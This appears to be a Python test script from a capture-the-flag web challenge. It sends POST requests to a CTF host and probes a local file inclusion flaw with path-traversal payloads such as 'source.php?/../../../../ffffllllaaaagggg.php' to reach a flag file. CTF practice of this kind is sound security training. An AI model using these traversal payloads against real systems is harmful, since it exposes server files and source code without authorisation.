# -*- coding: utf-8 -*-
"""LFI via POST body test"""
import requests

base = 'http://29f3b8fe57ff6823861b7021.http-ctf2.dasctf.com:80'

print('=== GET / 无参数（基准）===')
r = requests.get(base + '/', timeout=10)
print(f'  长度: {len(r.text)} | 开头: {r.text[:60].replace(chr(10), " ")}')
print()

print('=== POST file=source.php（验证 POST include）===')
r = requests.post(base + '/', data={'file': 'source.php'}, timeout=10)
print(f'  长度: {len(r.text)} | 含源码: {"checkFile" in r.text}')
print()

print('=== POST file=source.php?/../../ffffllllaaaagggg.php ===')
r = requests.post(base + '/', data={'file': 'source.php?/../../../../ffffllllaaaagggg.php'}, timeout=10)
print(f'  长度: {len(r.text)}')
if 'checkFile' in r.text:
    print('  -> include 了 source.php（?截断生效！）')
else:
    print(f'  内容: {r.text[:200].replace(chr(10), " ")}')
print()

print('=== POST file=hint.php?/../../ffffllllaaaagggg.php ===')
r = requests.post(base + '/', data={'file': 'hint.php?/../../../../ffffllllaaaagggg.php'}, timeout=10)
print(f'  长度: {len(r.text)}')
if 'flag not here' in r.text:
    print('  -> include 了 hint.php（?截断生效！）')
print(f'  内容: {r.text[:300].replace(chr(10), " ")}')
